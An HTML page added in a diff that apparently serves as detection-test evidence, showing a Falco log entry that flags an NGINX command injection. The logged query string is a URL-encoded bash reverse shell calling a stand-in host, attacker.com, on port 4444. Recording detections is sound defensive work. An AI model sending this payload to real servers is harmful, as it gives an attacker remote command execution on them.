@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: auto;
+            min-height: 600px;
+            overflow: auto;
+        }
+        body {
+            font-family: monospace;
+            padding: 15px;
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+            line-height: 1.5;
+        }
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            margin: 0;
+            overflow: visible;
+        }
+        .content {
+            overflow: visible;
+        }
+        mark {
+            background-color: #FFFF00;
+            color: #000;
+            padding: 1px 3px;
+            border-radius: 2px;
+        }
+        h3 {
+            color: #4CAF50;
+            margin: 0 0 15px 0;
+        }
+    </style>
+</head>
+<body>
+<h3>Detection Evidence (Falco Log Entry)</h3>
+<pre>13:45:34.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1772113534999-sx02n4 pattern_id=CMD_BASH_004 uri=/?q=<mark style="background-color: #FFFF00; padding: 1px 3px;">%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done</mark> client=127.0.0.1</pre>
+</body>
+</html>
